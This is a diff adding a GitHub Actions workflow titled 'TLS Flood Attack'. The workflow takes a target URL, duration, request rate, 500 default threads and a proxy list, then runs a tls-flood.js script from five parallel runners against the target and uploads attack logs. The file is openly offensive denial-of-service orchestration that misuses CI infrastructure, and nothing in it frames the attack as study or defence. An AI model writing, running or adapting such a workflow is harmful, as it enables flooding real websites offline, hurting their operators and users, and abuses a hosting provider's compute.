@@ -1,0 +1,60 @@
+name: TLS Flood Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL'
+        required: true
+        default: 'https://example.com'
+      time:
+        description: 'Attack duration in seconds'
+        required: true
+        default: '60'
+      rate:
+        description: 'Requests per second per thread'
+        required: true
+        default: '32'
+      threads:
+        description: 'Number of threads'
+        required: true
+        default: '500'
+      proxyfile:
+        description: 'Proxy file name'
+        required: true
+        default: 'proxy.txt'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]
+        
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    - name: Set up Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '16'
+        
+    - name: Install dependencies
+      run: |
+        npm install colors random-useragent
+        
+    - name: Run attack
+      env:
+        TARGET: ${{ github.event.inputs.target }}
+        TIME: ${{ github.event.inputs.time }}
+        RATE: ${{ github.event.inputs.rate }}
+        THREADS: ${{ github.event.inputs.threads }}
+        PROXY_FILE: ${{ github.event.inputs.proxyfile }}
+      run: node tls-flood.js $TARGET $TIME $RATE $THREADS $PROXY_FILE
+      
+    - name: Upload logs
+      uses: actions/upload-artifact@v3
+      with:
+        name: attack-logs-${{ matrix.instance }}
+        path: attack_logs.txt
